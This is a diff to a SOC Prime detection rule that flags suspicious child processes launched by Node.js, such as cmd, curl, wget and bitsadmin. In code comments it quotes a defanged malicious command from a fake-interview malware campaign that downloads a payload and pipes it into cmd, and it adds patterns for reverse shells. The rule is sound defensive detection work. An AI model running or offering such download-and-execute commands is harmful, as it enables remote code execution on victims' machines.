@@ -7,6 +7,7 @@ body: |-
   description: This rule is designed to identify suspicious activities involving NodeJS child processes initiated through the command line. It is highly recommended to baseline your activity and tune out common business use cases.
   author: SOC Prime Team
   references:
+      - https://research.jfrog.com/post/accurasofthire-fake-interview/
       - https://research.jfrog.com/post/beyond-testmetest-42-hijacked-github-repos/
       - https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
       - https://asec.ahnlab.com/en/95516/
@@ -36,7 +37,7 @@ body: |-
               - 'node.exe'
               - 'bun.exe'
           Image|endswith:
-              - 'cmd.exe' # interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography; https://asec.ahnlab.com/en/95516/
+              - 'cmd.exe' # curl hxxp://accurasofthire[.]com/notification-settings-win?download=1 | cmd https://research.jfrog.com/post/accurasofthire-fake-interview/; interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography; https://asec.ahnlab.com/en/95516/
               - 'powershell.exe' # interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/; https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
               - 'wscript.exe'
               - 'cscript.exe' #https://socket.dev/blog/axios-npm-package-compromised
@@ -60,7 +61,7 @@ body: |-
               - 'wget '
               - 'wget.exe'
               - 'schtasks'
-              - 'curl'
+              - 'curl' # curl hxxp://accurasofthire[.]com/notification-settings-win?download=1 | cmd https://research.jfrog.com/post/accurasofthire-fake-interview/
               - 'bitsadmin'
               - 'forfiles'
               - 'hh.exe'
@@ -71,7 +72,13 @@ body: |-
               - 'runonce'
               - 'msiexec'
               - 'regsvr32'
-              - 'cmd'
+              - '| cmd' # curl ... | cmd https://research.jfrog.com/post/accurasofthire-fake-interview/
+              - '|cmd'
+          - CommandLine|endswith: # bare interactive shell spawned by node (reverse shell); replaces generic 'cmd' that matched every 'cmd.exe /d /s /c' npm/yarn script
+              - '\cmd.exe'
+              - '\cmd.exe"'
+              - '\powershell.exe'
+              - '\powershell.exe"'
       filters:
           - CommandLine|contains|all:
               - 'Adobe'
@@ -91,4 +98,4 @@ body: |-
   level: medium
 level: medium
 created: '2025-06-19T06:49:14Z'
-updated: '2026-10-26T12:24:06.641000Z'
+updated: '2026-11-10T11:21:31.245000Z'
